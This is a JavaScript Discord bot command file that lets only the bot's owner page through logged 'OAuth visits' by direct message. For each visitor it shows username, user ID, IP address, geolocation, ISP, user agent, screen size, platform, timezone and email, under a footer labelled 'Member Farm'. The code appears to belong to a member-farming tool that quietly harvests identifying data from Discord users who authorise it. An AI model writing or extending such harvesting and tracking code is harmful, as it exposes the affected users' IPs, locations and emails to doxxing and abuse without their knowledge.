// language: JavaScript, file: visits_cmd.js
const { EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');
const { many, one } = require('./db');
const config = require('./config');

function trunc(s, n) {
  if (s == null || s === '') return '—';
  s = String(s);
  return s.length > n ? s.slice(0, n - 1) + '…' : s;
}

function formatVisit(v) {
  const who = v.username
    ? '**' + v.username + '**' + (v.global_name ? ' (' + v.global_name + ')' : '')
    : 'unknown';
  const uid = v.user_id ? '`' + v.user_id + '`' : '—';
  const geo = [v.city, v.region, v.country].filter(Boolean).join(', ') || '—';
  const lines = [
    '**#' + v.id + '** · ' + (v.status || '—') + ' · <t:' + (v.created_at || 0) + ':R>',
    'User: ' + who + ' · ' + uid,
    'IP: `' + trunc(v.ip, 48) + '`',
    'Geo: ' + trunc(geo, 80),
    'ISP: ' + trunc(v.isp || v.org, 60),
    'UA: ' + trunc(v.user_agent, 90),
    'Screen: ' + trunc(v.screen, 20) +
      ' · Platform: ' + trunc(v.platform, 24) +
      ' · TZ: ' + trunc(v.client_timezone || v.timezone, 32),
  ];
  if (v.email) lines.push('Email: `' + trunc(v.email, 40) + '`');
  if (v.error) lines.push('Error: ' + trunc(v.error, 80));
  return lines.join('\n');
}

async function handleVisits(message, client, args) {
  if (String(message.author.id) !== String(config.OWNER_ID)) return;

  const filterUser = args[0] && /^\d{17,20}$/.test(args[0]) ? args[0] : null;
  const limit = 100;

  let visits;
  if (filterUser) {
    visits = await many(
      'SELECT * FROM oauth_visits WHERE user_id = $1 ORDER BY id DESC LIMIT $2',
      [filterUser, limit]
    );
  } else {
    visits = await many('SELECT * FROM oauth_visits ORDER BY id DESC LIMIT $1', [limit]);
  }

  if (!visits.length) {
    await message.author.send('No OAuth visits logged yet.').catch(() => {});
    await message.reply('No visits found.').catch(() => {});
    return;
  }

  const total = filterUser
    ? (await one('SELECT COUNT(*)::int AS c FROM oauth_visits WHERE user_id = $1', [filterUser]))?.c || visits.length
    : (await one('SELECT COUNT(*)::int AS c FROM oauth_visits'))?.c || visits.length;

  const perPage = 3;
  const pages = [];
  for (let i = 0; i < visits.length; i += perPage) {
    const chunk = visits.slice(i, i + perPage);
    const desc = chunk.map(formatVisit).join('\n\n');
    pages.push(
      new EmbedBuilder()
        .setTitle(
          'OAuth Visits (' +
            (Math.floor(i / perPage) + 1) +
            '/' +
            Math.ceil(visits.length / perPage) +
            ')'
        )
        .setDescription(desc.slice(0, 4000))
        .setColor(0x5865f2)
        .setFooter({
          text:
            'Member Farm · ' +
            total +
            ' total' +
            (filterUser ? ' · user ' + filterUser : '') +
            ' · showing last ' +
            visits.length,
        })
        .setTimestamp()
    );
  }

  const row = new ActionRowBuilder().addComponents(
    new ButtonBuilder().setCustomId('visits_prev').setLabel('◀').setStyle(ButtonStyle.Secondary),
    new ButtonBuilder().setCustomId('visits_next').setLabel('▶').setStyle(ButtonStyle.Secondary)
  );

  const dm = await message.author.send({
    embeds: [pages[0]],
    components: pages.length > 1 ? [row] : [],
  });

  if (pages.length > 1) {
    if (!client.visitsPages) client.visitsPages = new Map();
    client.visitsPages.set(dm.id, { pages, index: 0, owner: message.author.id });
  }

  await message.reply('Sent visits in DM.' + (filterUser ? ' (filtered)' : '')).catch(() => {});
}

module.exports = { handleVisits };
